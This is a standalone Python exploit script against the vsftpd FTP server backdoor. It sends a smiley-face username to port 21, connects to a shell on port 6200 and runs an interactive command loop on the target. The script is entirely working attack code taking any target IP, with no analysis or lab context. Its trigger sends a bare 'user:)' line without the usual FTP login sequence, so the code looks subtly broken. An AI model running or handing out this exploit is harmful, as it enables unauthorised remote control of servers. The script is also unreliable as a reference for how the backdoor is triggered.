import socket
import sys
import time

def exploit_vsftpd(target_ip, target_port=21):
    try:
        # Connect to the FTP server
        sock = socket.create_connection((target_ip, target_port), timeout=10)
        print(f"[*] Connected to {target_ip}:{target_port}")

        # Send the backdoor username
        backdoor_username = "user:)\n"
        sock.sendall(backdoor_username.encode())

        # Receive the response from the server
        response = sock.recv(1024).decode()
        print(f"[*] Server response: {response}")

        # If the backdoor is triggered, the server should spawn a shell on port 6200
        time.sleep(1)  # Wait for the shell to start

        # Connect to the spawned shell
        shell_sock = socket.create_connection((target_ip, 6200), timeout=10)
        print("[*] Connected to the spawned shell")

        # Send commands to the shell
        while True:
            command = input("Shell> ")
            if command.lower() == "exit":
                break
            shell_sock.sendall((command + "\n").encode())
            output = shell_sock.recv(4096).decode()
            print(output)

        # Close the connections
        shell_sock.close()
        sock.close()
        print("[*] Connections closed")

    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"[*] Usage: {sys.argv[0]} <target_ip>")
    else:
        target_ip = sys.argv[1]
        exploit_vsftpd(target_ip)